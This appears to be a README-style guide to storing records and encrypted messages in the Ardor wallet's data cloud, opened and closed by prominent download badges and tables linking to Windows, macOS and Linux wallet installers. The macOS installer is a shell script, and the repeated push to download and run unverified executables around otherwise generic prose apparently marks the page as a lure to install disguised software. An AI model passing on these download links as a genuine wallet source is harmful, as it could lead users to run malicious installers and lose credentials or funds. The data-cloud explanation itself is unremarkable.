![Ardor Wallet guide](assets/banner-article.png)

# Store data on the Ardor data cloud

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

The Ardor data cloud stores small pieces of data on chain, attached to an account and addressed by a name, and it also carries encrypted messages between accounts. It is not a file host: what it stores is small, permanent and public, which makes it right for records and proofs rather than for documents.

## What the data cloud is

A record in the data cloud is a named piece of data belonging to an [account](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md). Because it lives on chain, it inherits the chain's properties: it is timestamped when written, it is readable by anyone, and it cannot be quietly changed afterwards by you or by anybody else.

The size limit is the important constraint. This is a place for a hash, a short note, a reference or a small structured record, not for a scan of a [contract](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-lightweight-contracts.md) or a photograph. Confusing it with cloud storage is the most common misunderstanding, and an expensive one once a large file has been rejected.

## Storing a record

1. Start the wallet, unlock it, and pick the [Ardor chain](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md) that will hold the data.
2. Open the data cloud section and choose to add a record.
3. Give it a name and enter the data, keeping it within the size the field allows.
4. Choose whether the record is public or encrypted.
5. Confirm the transaction and pay the [Ardor fee](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/why-an-ardor-transaction-stays-unconfirmed.md).
6. Read it back to confirm it stored what you intended.

Step six matters because the record is permanent. A typo in a public record is visible for as long as the chain exists, and there is no edit that removes the earlier version.

## Tagged data and messages

Two shapes of data are worth knowing. Tagged data is a record with a name and a type, useful for structured information that somebody else might want to read or index. Encrypted messages are addressed to another account, readable only by its holder.

The difference is who the data is for. A tagged record is a public statement or reference; an encrypted message is a private communication whose existence is public even though its content is not.

## What it costs and what it keeps

Each record is a transaction with a fee, so the cost scales with how many records you write rather than with their size. That makes many small records more expensive than one slightly larger one, which is worth knowing before a script writes a record per row.

What it keeps is the record itself, permanently. That permanence is the feature: a timestamped entry that nobody can alter is exactly what a proof needs, and exactly the wrong thing for data you may want to withdraw later. Deciding which of the two you are writing is the whole judgement call.

## Reading data back

Records are read from the wallet or through the API, filtered by account and by name. Because they are on chain, anyone can read a public record without your involvement, which is the point of publishing one, and nobody needs your permission to check it later.

For an encrypted message, the reader needs the account it was addressed to. The chain records that a message exists; only the recipient can read the content, and only if they still hold the account the message was addressed to - a detail that matters when an account is retired.

## Choosing what to record

The decision is about permanence, not about size. A record that will still make sense in five years is a good candidate; one that describes a temporary arrangement is not, because it cannot be withdrawn.

A useful test: would you be comfortable with this text and this timestamp being readable by anyone, indefinitely? If the answer depends on circumstances, the data cloud is the wrong place and the record should point at something stored elsewhere.

## Data cloud versus a database

A database is for data you will change, query in many ways and eventually delete. The data cloud is for assertions you want to make once and have verified later - a hash, an attestation, a reference.

Using it as a database produces a system that is expensive per row, impossible to migrate and permanent in every direction. Using a database where a proof belongs produces something that can be edited by the party who benefits from editing it.

## Where it fits

The data cloud is the right tool for a hash of a document, a short attestation, a reference to something stored elsewhere, or a message that needs to exist in public view without being readable by the public.

It is the wrong tool for backups, media, or anything you might need to delete. Those belong in storage designed for them, with a record on chain pointing at what was stored and when, which gives you the timestamp without the permanence of the content itself.

## FAQ

### Can I store a whole document in the data cloud?

Not practically. The records are small by design. Store the document elsewhere and put its hash or reference on chain.

### Are data cloud records private?

Only if you encrypt them. A public record is readable by anyone, and its existence is visible either way.

### Can I delete a record?

No. Records are permanent, and no later transaction removes an earlier one. Choose what you write with that in mind.

### Do records cost more as they get bigger?

The cost is per transaction, within the size limit. Many small records cost more in total than one larger record.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Prove a document existed on a date with Ardor](https://github.com/ardor-software/ardor-platform-guides/blob/main/prove-a-document-existed-with-ardor.md)
- [What Ignis is on Ardor, and what the wallet does with it](https://github.com/ardor-software/ardor-platform-guides/blob/main/what-is-ignis-on-ardor.md)
- [Sell on the Ardor marketplace](https://github.com/ardor-software/ardor-platform-guides/blob/main/sell-on-the-ardor-marketplace.md)
- [Create a poll and vote in the Ardor wallet](https://github.com/ardor-software/ardor-platform-guides/blob/main/create-a-poll-in-ardor-wallet.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
